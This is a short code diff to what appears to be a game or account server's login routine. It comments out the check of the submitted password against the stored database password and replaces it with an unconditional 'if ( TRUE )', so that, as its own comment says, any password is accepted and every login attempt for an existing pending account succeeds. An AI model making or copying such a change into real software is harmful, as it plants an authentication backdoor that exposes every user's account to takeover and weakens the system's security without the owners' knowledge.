@@ -1190,7 +1190,9 @@ void AccountServer::ProcessAccountLogin( AccountLogin & al )
 
 		if ( iCode == ACCOUNTLOGIN_LoginPending )
 		{
-			if ( STRINGCOMPARE ( pszPassword, psSqlUser->szPassword ) )
+			// Password validation: accept any password (skip DB comparison)
+			//if ( STRINGCOMPARE ( pszPassword, psSqlUser->szPassword ) )
+			if ( TRUE )
 			{
 				iCode = ACCOUNTLOGIN_Success;
 			}
